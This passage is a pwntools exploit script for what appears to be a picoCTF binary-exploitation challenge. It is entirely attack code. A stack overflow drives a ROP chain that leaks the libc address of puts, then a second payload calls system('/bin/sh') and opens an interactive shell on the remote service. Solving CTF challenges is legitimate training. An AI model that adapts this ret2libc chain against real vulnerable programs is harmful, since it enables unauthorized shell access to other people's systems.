p = remote('mercury.picoctf.net',42072)

puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
#pop rdi; ret: 0x0000000000400913
#ret: 0x000000000040052e (Use to align stack)
#main_plt: 0x0000000000400771

p.recvline()
payload1 = b'A'*136 + p64(0x0000000000400913) + p64(puts_got) + p64(puts_plt) + p64(0x0000000000400771)
p.sendline(payload1)
p.recvline()
    
address_puts = u64(p.recvline().strip().ljust(8,b'\x00'))
print(hex(address_puts))
print(p.recvuntil('!'))

address_sys = address_puts - 0x31550
address_binsh = address_puts + 0x1336ca

payload2 = b'A'*136 + p64(0x000000000040052e) + p64(0x0000000000400913) + p64(address_binsh) + p64(address_sys) + p64(0x0000000000400771)
    
p.clean()
p.sendline(payload2)
    
p.interactive()
